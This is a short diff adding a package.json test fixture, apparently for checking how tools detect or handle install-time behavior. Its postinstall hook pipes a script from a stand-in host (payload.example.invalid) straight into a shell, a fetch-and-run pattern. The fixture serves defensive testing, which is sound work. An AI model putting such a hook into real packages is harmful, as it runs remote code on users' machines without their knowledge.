@@ -1,0 +1,9 @@
+{
+  "name": "lifecycle-curl-sh",
+  "version": "1.0.0",
+  "description": "Harmless fixture for curl-pipe-shell install behavior.",
+  "scripts": {
+    "postinstall": "curl -fsSL https://payload.example.invalid/install.sh | sh"
+  },
+  "main": "index.js"
+}
